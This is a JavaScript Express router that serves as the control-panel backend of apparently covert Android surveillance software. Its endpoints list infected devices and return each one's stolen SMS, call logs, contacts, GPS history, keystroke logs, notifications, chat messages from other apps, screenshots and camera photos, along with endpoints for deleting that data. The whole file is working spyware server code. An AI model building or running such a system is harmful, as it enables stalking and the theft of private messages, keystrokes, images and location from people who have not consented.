const express = require('express');
const prisma = require('../lib/db');

const router = express.Router();

// Helper: Find device by either deviceId (Android ID) or internal id
async function findDevice(identifier) {
    let device = await prisma.device.findUnique({ where: { deviceId: identifier } });
    if (!device) {
        device = await prisma.device.findUnique({ where: { id: identifier } });
    }
    return device;
}

/**
 * GET /api/devices
 * Get all registered devices
 */
router.get('/', async (req, res) => {
    try {
        const devices = await prisma.device.findMany({
            orderBy: { lastSeen: 'desc' },
            include: {
                locations: {
                    orderBy: { timestamp: 'desc' },
                    take: 1
                },
                _count: {
                    select: {
                        smsLogs: true,
                        callLogs: true,
                        screenshots: true,
                        photos: true
                    }
                }
            }
        });

        res.json({
            success: true,
            devices: devices.map(device => ({
                id: device.id,
                deviceId: device.deviceId,
                model: device.model,
                manufacturer: device.manufacturer,
                androidVersion: device.androidVersion,
                isOnline: device.isOnline,
                lastSeen: device.lastSeen,
                lastLocation: device.locations.length > 0 ? {
                    latitude: device.locations[0].latitude,
                    longitude: device.locations[0].longitude,
                    accuracy: device.locations[0].accuracy,
                    timestamp: device.locations[0].timestamp
                } : null,
                stats: {
                    sms: device._count.smsLogs,
                    calls: device._count.callLogs,
                    screenshots: device._count.screenshots,
                    photos: device._count.photos
                }
            }))
        });
    } catch (error) {
        console.error('[DEVICES] List error:', error);
        res.status(500).json({ success: false, error: 'Failed to get devices' });
    }
});

/**
 * GET /api/devices/status/realtime
 * Get real-time status from active socket connections
 */
router.get('/status/realtime', async (req, res) => {
    try {
        const { connectedDevices } = require('../shared/state');

        console.log(`[REALTIME] Checking status. Map size: ${connectedDevices.size}`);
        console.log(`[REALTIME] Connected devices in map:`, Array.from(connectedDevices.entries()));

        // Get all deviceIds from connected map
        const onlineDeviceIds = new Set();
        for (const [, deviceId] of connectedDevices.entries()) {
            onlineDeviceIds.add(deviceId);
        }

        // Get all devices from database
        const devices = await prisma.device.findMany({
            select: { id: true, deviceId: true, isOnline: true }
        });

        // Update database to match real socket status
        for (const device of devices) {
            const isReallyOnline = onlineDeviceIds.has(device.deviceId);

            if (device.isOnline !== isReallyOnline) {
                await prisma.device.update({
                    where: { id: device.id },
                    data: { isOnline: isReallyOnline }
                });
                console.log(`[REALTIME] Corrected ${device.deviceId}: ${device.isOnline} -> ${isReallyOnline}`);
            }
        }

        res.json({
            success: true,
            connectedCount: onlineDeviceIds.size,
            connectedDevices: Array.from(onlineDeviceIds),
            timestamp: Date.now()
        });
    } catch (error) {
        console.error('[DEVICES] Realtime status error:', error);
        res.status(500).json({ success: false, error: 'Failed to get realtime status' });
    }
});

/**
 * GET /api/devices/:deviceId
 * Get single device with full details
 */
router.get('/:deviceId', async (req, res) => {
    try {
        const { deviceId } = req.params;

        // Find by deviceId or internal id, then get with counts
        const foundDevice = await findDevice(deviceId);
        if (!foundDevice) {
            return res.status(404).json({ success: false, error: 'Device not found' });
        }

        const device = await prisma.device.findUnique({
            where: { id: foundDevice.id },
            include: {
                _count: {
                    select: {
                        smsLogs: true,
                        callLogs: true,
                        contacts: true,
                        locations: true,
                        keylogs: true,
                        apps: true,
                        notifications: true,
                        screenshots: true,
                        photos: true,
                        commands: true
                    }
                }
            }
        });

        if (!device) {
            return res.status(404).json({ success: false, error: 'Device not found' });
        }

        // Get latest location
        const latestLocation = await prisma.location.findFirst({
            where: { deviceId: device.id },
            orderBy: { timestamp: 'desc' }
        });

        res.json({
            success: true,
            device: {
                id: device.id,
                deviceId: device.deviceId,
                model: device.model,
                manufacturer: device.manufacturer,
                androidVersion: device.androidVersion,
                appVersion: device.appVersion,
                isOnline: device.isOnline,
                lastSeen: device.lastSeen,
                createdAt: device.createdAt,
                latestLocation: latestLocation ? {
                    latitude: latestLocation.latitude,
                    longitude: latestLocation.longitude,
                    timestamp: latestLocation.timestamp
                } : null,
                stats: device._count
            }
        });
    } catch (error) {
        console.error('[DEVICES] Get error:', error);
        res.status(500).json({ success: false, error: 'Failed to get device' });
    }
});

/**
 * GET /api/devices/:deviceId/sms
 * Get SMS logs for a device (with contact name lookup)
 */
router.get('/:deviceId/sms', async (req, res) => {
    try {
        const { deviceId } = req.params;
        const { page = 1, limit = 50, type } = req.query;

        const device = await findDevice(deviceId);
        if (!device) {
            return res.status(404).json({ success: false, error: 'Device not found' });
        }

        const where = { deviceId: device.id };
        if (type) where.type = type;

        const [smsLogs, total, contacts] = await Promise.all([
            prisma.smsLog.findMany({
                where,
                orderBy: { timestamp: 'desc' },
                skip: (parseInt(page) - 1) * parseInt(limit),
                take: parseInt(limit)
            }),
            prisma.smsLog.count({ where }),
            prisma.contact.findMany({
                where: { deviceId: device.id },
                select: { phone: true, name: true }
            })
        ]);

        // Build phone -> name lookup map with multiple normalized keys
        const contactMap = {};

        // Helper to normalize phone number - extract last 10 digits
        const normalizePhone = (phone) => {
            if (!phone) return null;
            // Remove all non-digit characters
            const digits = phone.replace(/\D/g, '');
            // Return last 10 digits (handles country codes like +91, 91, etc)
            return digits.slice(-10);
        };

        for (const contact of contacts) {
            if (contact.phone && contact.name) {
                const normalized = normalizePhone(contact.phone);
                if (normalized && normalized.length >= 10) {
                    contactMap[normalized] = contact.name;
                }
                // Also store original for exact matches
                contactMap[contact.phone] = contact.name;
            }
        }

        // Enrich SMS logs with contact names
        const enrichedLogs = smsLogs.map(sms => {
            let name = sms.name;
            if (!name || name === 'Unknown') {
                const normalized = normalizePhone(sms.address);
                name = contactMap[normalized] || contactMap[sms.address] || null;
            }
            return { ...sms, name };
        });

        res.json({
            success: true,
            data: enrichedLogs,
            pagination: {
                page: parseInt(page),
                limit: parseInt(limit),
                total,
                pages: Math.ceil(total / parseInt(limit))
            }
        });
    } catch (error) {
        console.error('[DEVICES] SMS error:', error);
        res.status(500).json({ success: false, error: 'Failed to get SMS logs' });
    }
});

/**
 * GET /api/devices/:deviceId/calls
 * Get call logs for a device (with contact name lookup)
 */
router.get('/:deviceId/calls', async (req, res) => {
    try {
        const { deviceId } = req.params;
        const { page = 1, limit = 50, type } = req.query;

        const device = await findDevice(deviceId);
        if (!device) {
            return res.status(404).json({ success: false, error: 'Device not found' });
        }

        const where = { deviceId: device.id };
        if (type) where.type = type;

        const [callLogs, total, contacts] = await Promise.all([
            prisma.callLog.findMany({
                where,
                orderBy: { timestamp: 'desc' },
                skip: (parseInt(page) - 1) * parseInt(limit),
                take: parseInt(limit)
            }),
            prisma.callLog.count({ where }),
            prisma.contact.findMany({
                where: { deviceId: device.id },
                select: { phone: true, name: true }
            })
        ]);

        // Build phone -> name lookup map with multiple normalized keys
        const contactMap = {};

        // Helper to normalize phone number - extract last 10 digits
        const normalizePhone = (phone) => {
            if (!phone) return null;
            // Remove all non-digit characters
            const digits = phone.replace(/\D/g, '');
            // Return last 10 digits (handles country codes like +91, 91, etc)
            return digits.slice(-10);
        };

        for (const contact of contacts) {
            if (contact.phone && contact.name) {
                const normalized = normalizePhone(contact.phone);
                if (normalized && normalized.length >= 10) {
                    contactMap[normalized] = contact.name;
                }
                // Also store original for exact matches
                contactMap[contact.phone] = contact.name;
            }
        }

        // Enrich call logs with contact names
        const enrichedLogs = callLogs.map(call => {
            let name = call.name;
            if (!name || name === 'Unknown') {
                // Try to find contact name by normalized number
                const normalized = normalizePhone(call.number);
                name = contactMap[normalized] || contactMap[call.number] || null;
            }
            return { ...call, name };
        });

        res.json({
            success: true,
            data: enrichedLogs,
            pagination: {
                page: parseInt(page),
                limit: parseInt(limit),
                total,
                pages: Math.ceil(total / parseInt(limit))
            }
        });
    } catch (error) {
        console.error('[DEVICES] Calls error:', error);
        res.status(500).json({ success: false, error: 'Failed to get call logs' });
    }
});

/**
 * GET /api/devices/:deviceId/contacts
 * Get contacts for a device
 */
router.get('/:deviceId/contacts', async (req, res) => {
    try {
        const { deviceId } = req.params;
        const { search } = req.query;

        const device = await findDevice(deviceId);
        if (!device) {
            return res.status(404).json({ success: false, error: 'Device not found' });
        }

        const where = { deviceId: device.id };
        if (search) {
            where.OR = [
                { name: { contains: search } },
                { phone: { contains: search } }
            ];
        }

        const contacts = await prisma.contact.findMany({
            where,
            orderBy: { name: 'asc' }
        });

        res.json({
            success: true,
            data: contacts,
            total: contacts.length
        });
    } catch (error) {
        console.error('[DEVICES] Contacts error:', error);
        res.status(500).json({ success: false, error: 'Failed to get contacts' });
    }
});

/**
 * GET /api/devices/:deviceId/locations
 * Get location history for a device
 */
router.get('/:deviceId/locations', async (req, res) => {
    try {
        const { deviceId } = req.params;
        const { from, to, limit = 100 } = req.query;

        const device = await findDevice(deviceId);
        if (!device) {
            return res.status(404).json({ success: false, error: 'Device not found' });
        }

        const where = { deviceId: device.id };
        if (from || to) {
            where.timestamp = {};
            if (from) where.timestamp.gte = new Date(from);
            if (to) where.timestamp.lte = new Date(to);
        }

        const locations = await prisma.location.findMany({
            where,
            orderBy: { timestamp: 'desc' },
            take: parseInt(limit)
        });

        res.json({
            success: true,
            data: locations,
            total: locations.length
        });
    } catch (error) {
        console.error('[DEVICES] Locations error:', error);
        res.status(500).json({ success: false, error: 'Failed to get locations' });
    }
});

/**
 * GET /api/devices/:deviceId/keylogs
 * Get keylog data for a device
 */
router.get('/:deviceId/keylogs', async (req, res) => {
    try {
        const { deviceId } = req.params;
        const { page = 1, limit = 100, app } = req.query;

        const device = await findDevice(deviceId);
        if (!device) {
            return res.status(404).json({ success: false, error: 'Device not found' });
        }

        const where = { deviceId: device.id };
        if (app) where.app = app;

        const [keylogs, total] = await Promise.all([
            prisma.keylog.findMany({
                where,
                orderBy: { timestamp: 'desc' },
                skip: (parseInt(page) - 1) * parseInt(limit),
                take: parseInt(limit)
            }),
            prisma.keylog.count({ where })
        ]);

        res.json({
            success: true,
            data: keylogs,
            pagination: {
                page: parseInt(page),
                limit: parseInt(limit),
                total,
                pages: Math.ceil(total / parseInt(limit))
            }
        });
    } catch (error) {
        console.error('[DEVICES] Keylogs error:', error);
        res.status(500).json({ success: false, error: 'Failed to get keylogs' });
    }
});

/**
 * DELETE /api/devices/:deviceId/keylogs
 * Delete keylogs for a device (optionally filtered by app)
 */
router.delete('/:deviceId/keylogs', async (req, res) => {
    try {
        const { deviceId } = req.params;
        const { app, appName } = req.query;

        const device = await findDevice(deviceId);
        if (!device) {
            return res.status(404).json({ success: false, error: 'Device not found' });
        }

        const where = { deviceId: device.id };
        // Filter by app name if provided
        if (app || appName) {
            where.appName = app || appName;
        }

        const result = await prisma.keylog.deleteMany({ where });

        console.log(`[DEVICES] Deleted ${result.count} keylogs for ${deviceId}${app ? ` (app: ${app})` : ''}`);
        res.json({ success: true, deleted: result.count });
    } catch (error) {
        console.error('[DEVICES] Delete keylogs error:', error);
        res.status(500).json({ success: false, error: 'Failed to delete keylogs' });
    }
});

/**
 * GET /api/devices/:deviceId/apps
 * Get installed apps for a device
 */
router.get('/:deviceId/apps', async (req, res) => {
    try {
        const { deviceId } = req.params;
        const { includeSystem = false } = req.query;

        const device = await findDevice(deviceId);
        if (!device) {
            return res.status(404).json({ success: false, error: 'Device not found' });
        }

        const where = { deviceId: device.id };
        if (!includeSystem || includeSystem === 'false') {
            where.isSystem = false;
        }

        const apps = await prisma.appInfo.findMany({
            where,
            orderBy: { name: 'asc' }
        });

        res.json({
            success: true,
            data: apps,
            total: apps.length
        });
    } catch (error) {
        console.error('[DEVICES] Apps error:', error);
        res.status(500).json({ success: false, error: 'Failed to get apps' });
    }
});

/**
 * GET /api/devices/:deviceId/notifications
 * Get notification logs for a device
 */
router.get('/:deviceId/notifications', async (req, res) => {
    try {
        const { deviceId } = req.params;
        const { page = 1, limit = 50, app } = req.query;

        const device = await findDevice(deviceId);
        if (!device) {
            return res.status(404).json({ success: false, error: 'Device not found' });
        }

        const where = { deviceId: device.id };
        if (app) where.app = app;

        const [notifications, total] = await Promise.all([
            prisma.notificationLog.findMany({
                where,
                orderBy: { timestamp: 'desc' },
                skip: (parseInt(page) - 1) * parseInt(limit),
                take: parseInt(limit)
            }),
            prisma.notificationLog.count({ where })
        ]);

        res.json({
            success: true,
            data: notifications,
            pagination: {
                page: parseInt(page),
                limit: parseInt(limit),
                total,
                pages: Math.ceil(total / parseInt(limit))
            }
        });
    } catch (error) {
        console.error('[DEVICES] Notifications error:', error);
        res.status(500).json({ success: false, error: 'Failed to get notifications' });
    }
});

/**
 * GET /api/devices/:deviceId/logs
 * Get app logs for a device with pagination and filtering
 */
router.get('/:deviceId/logs', async (req, res) => {
    try {
        const { deviceId } = req.params;
        const { page = 1, limit = 100, level, tag } = req.query;

        const where = { deviceId };
        if (level) where.level = level;
        if (tag) where.tag = { contains: tag };

        const [logs, total] = await Promise.all([
            prisma.deviceLog.findMany({
                where,
                orderBy: { timestamp: 'desc' },
                skip: (parseInt(page) - 1) * parseInt(limit),
                take: parseInt(limit)
            }),
            prisma.deviceLog.count({ where })
        ]);

        res.json({
            success: true,
            data: logs,
            pagination: {
                page: parseInt(page),
                limit: parseInt(limit),
                total,
                pages: Math.ceil(total / parseInt(limit))
            }
        });
    } catch (error) {
        console.error('[DEVICES] Logs error:', error);
        res.status(500).json({ success: false, error: 'Failed to get logs' });
    }
});

/**
 * GET /api/devices/:deviceId/chats
 * Get chat messages for a device with pagination and filtering
 */
router.get('/:deviceId/chats', async (req, res) => {
    try {
        const { deviceId } = req.params;
        const { page = 1, limit = 100, chatApp, contactName } = req.query;

        const device = await findDevice(deviceId);
        if (!device) {
            return res.status(404).json({ success: false, error: 'Device not found' });
        }

        const where = { deviceId: device.id };
        if (chatApp) where.chatApp = chatApp;
        if (contactName) where.contactName = { contains: contactName };

        const [chatMessages, total] = await Promise.all([
            prisma.chatMessage.findMany({
                where,
                orderBy: { timestamp: 'desc' },
                skip: (parseInt(page) - 1) * parseInt(limit),
                take: parseInt(limit)
            }),
            prisma.chatMessage.count({ where })
        ]);

        // Get unique apps for filtering
        const apps = await prisma.chatMessage.groupBy({
            by: ['chatApp'],
            where: { deviceId: device.id },
            _count: { chatApp: true }
        });

        // Get unique contacts for filtering
        const contacts = await prisma.chatMessage.groupBy({
            by: ['contactName'],
            where: { deviceId: device.id, contactName: { not: null } },
            _count: { contactName: true }
        });

        res.json({
            success: true,
            data: chatMessages,
            filters: {
                apps: apps.map(a => ({ app: a.chatApp, count: a._count.chatApp })),
                contacts: contacts.map(c => ({ name: c.contactName, count: c._count.contactName }))
            },
            pagination: {
                page: parseInt(page),
                limit: parseInt(limit),
                total,
                pages: Math.ceil(total / parseInt(limit))
            }
        });
    } catch (error) {
        console.error('[DEVICES] Chats error:', error);
        res.status(500).json({ success: false, error: 'Failed to get chat messages' });
    }
});

/**
 * DELETE /api/devices/:deviceId/chats
 * Delete chat messages for a device (optionally filtered by app and contact)
 */
router.delete('/:deviceId/chats', async (req, res) => {
    try {
        const { deviceId } = req.params;
        const { chatApp, contactName } = req.query;

        const device = await findDevice(deviceId);
        if (!device) {
            return res.status(404).json({ success: false, error: 'Device not found' });
        }

        const where = { deviceId: device.id };
        if (chatApp) where.chatApp = chatApp;
        if (contactName) where.contactName = contactName;

        const result = await prisma.chatMessage.deleteMany({ where });

        console.log(`[DEVICES] Deleted ${result.count} chat messages for ${deviceId}${chatApp ? ` (app: ${chatApp})` : ''}${contactName ? ` (contact: ${contactName})` : ''}`);
        res.json({ success: true, deleted: result.count });
    } catch (error) {
        console.error('[DEVICES] Delete chats error:', error);
        res.status(500).json({ success: false, error: 'Failed to delete chat messages' });
    }
});

/**
 * GET /api/devices/:deviceId/screenshots
 * Get screenshots for a device
 */
router.get('/:deviceId/screenshots', async (req, res) => {
    try {
        const { deviceId } = req.params;
        const { page = 1, limit = 20 } = req.query;

        const device = await findDevice(deviceId);
        if (!device) {
            return res.status(404).json({ success: false, error: 'Device not found' });
        }

        const [screenshots, total] = await Promise.all([
            prisma.screenshot.findMany({
                where: { deviceId: device.id },
                orderBy: { timestamp: 'desc' },
                skip: (parseInt(page) - 1) * parseInt(limit),
                take: parseInt(limit)
            }),
            prisma.screenshot.count({ where: { deviceId: device.id } })
        ]);

        res.json({
            success: true,
            data: screenshots.map(s => ({
                id: s.id,
                fileName: s.fileName,
                fileSize: s.fileSize,
                timestamp: s.timestamp,
                // Return data URL if stored in DB, otherwise fallback to file path
                url: s.data
                    ? `data:${s.mimeType || 'image/jpeg'};base64,${s.data}`
                    : (s.filePath ? `${process.env.SERVER_URL || 'http://localhost:3000'}${s.filePath}` : null)
            })),
            pagination: {
                page: parseInt(page),
                limit: parseInt(limit),
                total,
                pages: Math.ceil(total / parseInt(limit))
            }
        });
    } catch (error) {
        console.error('[DEVICES] Screenshots error:', error);
        res.status(500).json({ success: false, error: 'Failed to get screenshots' });
    }
});

/**
 * GET /api/devices/:deviceId/photos
 * Get photos for a device
 */
router.get('/:deviceId/photos', async (req, res) => {
    try {
        const { deviceId } = req.params;
        const { page = 1, limit = 20, camera } = req.query;

        const device = await findDevice(deviceId);
        if (!device) {
            return res.status(404).json({ success: false, error: 'Device not found' });
        }

        const where = { deviceId: device.id };
        if (camera) where.camera = camera;

        const [photos, total] = await Promise.all([
            prisma.photo.findMany({
                where,
                orderBy: { timestamp: 'desc' },
                skip: (parseInt(page) - 1) * parseInt(limit),
                take: parseInt(limit)
            }),
            prisma.photo.count({ where })
        ]);

        res.json({
            success: true,
            data: photos.map(p => ({
                id: p.id,
                fileName: p.fileName,
                fileSize: p.fileSize,
                camera: p.camera,
                timestamp: p.timestamp,
                // Return data URL if stored in DB, otherwise fallback to file path
                url: p.data
                    ? `data:${p.mimeType || 'image/jpeg'};base64,${p.data}`
                    : (p.filePath ? `${process.env.SERVER_URL || 'http://localhost:3000'}${p.filePath}` : null)
            })),
            pagination: {
                page: parseInt(page),
                limit: parseInt(limit),
                total,
                pages: Math.ceil(total / parseInt(limit))
            }
        });
    } catch (error) {
        console.error('[DEVICES] Photos error:', error);
        res.status(500).json({ success: false, error: 'Failed to get photos' });
    }
});

/**
 * DELETE /api/devices/:deviceId
 * Delete a device and all its data
 */
router.delete('/:deviceId', async (req, res) => {
    try {
        const { deviceId } = req.params;

        const device = await prisma.device.findUnique({ where: { deviceId } });
        if (!device) {
            return res.status(404).json({ success: false, error: 'Device not found' });
        }

        // Delete device (cascades to all related data)
        await prisma.device.delete({ where: { id: device.id } });

        console.log(`[DEVICES] Deleted device: ${deviceId}`);
        res.json({ success: true, message: 'Device deleted' });
    } catch (error) {
        console.error('[DEVICES] Delete error:', error);
        res.status(500).json({ success: false, error: 'Failed to delete device' });
    }
});

module.exports = router;
